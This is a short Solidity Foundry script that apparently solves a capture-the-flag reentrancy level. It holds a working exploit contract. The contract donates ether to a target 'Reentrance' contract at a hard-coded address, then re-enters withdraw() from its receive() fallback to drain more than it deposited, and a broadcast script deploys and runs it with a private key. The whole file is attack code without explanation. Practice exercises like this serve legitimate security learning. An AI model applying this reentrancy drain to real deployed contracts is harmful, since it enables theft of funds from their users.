// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackReentrant {

    Reentrance public reentranceInstance = Reentrance(payable(0x3BA2cC67ecaAF926DFe3B92250c6Ea85143AD568));

    constructor() public payable {
        // Donate 0.001 to ourselfes
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        // Withdraw the 0.001
        reentranceInstance.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value: 0.002 ether}("");
        require(result);
    }


    receive() external payable {
        // Reenter and withdraw again the 0.001 of the contract
        reentranceInstance.withdraw(0.001 ether);
    }

}

contract ReentrancySolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackReentrant attackReentrant = new AttackReentrant{value: 0.001 ether}();
        attackReentrant.withdraw();
        vm.stopBroadcast();
    }
}